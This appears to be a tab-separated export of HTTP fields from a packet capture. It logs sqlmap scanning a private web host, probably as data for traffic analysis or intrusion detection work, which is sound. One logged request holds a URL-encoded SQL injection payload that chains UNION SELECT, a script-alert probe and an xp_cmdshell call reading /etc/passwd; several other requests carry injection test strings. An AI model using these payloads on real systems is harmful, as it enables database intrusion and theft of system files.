http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip,deflate										no-cache						close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web
*/*	gzip,deflate										no-cache						close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/
*/*	gzip,deflate										no-cache						close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web
*/*	gzip,deflate										no-cache						close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ&EGvB=6679%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ&EGvB=6679%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=8594		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=8594
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%22%2C%29%2C%27.%29%29%29%29		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%22%2C%29%2C%27.%29%29%29%29
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%27wvLNtl%3C%27%22%3EoKClDY		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%27wvLNtl%3C%27%22%3EoKClDY
